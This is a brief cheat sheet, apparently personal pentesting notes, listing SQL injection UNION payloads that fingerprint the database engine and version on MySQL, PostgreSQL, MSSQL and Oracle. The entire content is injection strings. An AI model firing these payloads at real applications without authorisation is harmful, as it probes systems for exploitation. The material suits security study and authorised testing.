# identify-sql-engine

Author: Julien Bongars
Date: 2025-09-20 17:16:00

---

## MySQL

```sql
' UNION SELECT @@version--
' UNION SELECT version()--
```

## PostgreSQL

```sql
' UNION SELECT version()--
```

## MSSQL

```sql
' UNION SELECT @@version--
```

## Oracle

```sql
' UNION SELECT banner FROM v$version--
```
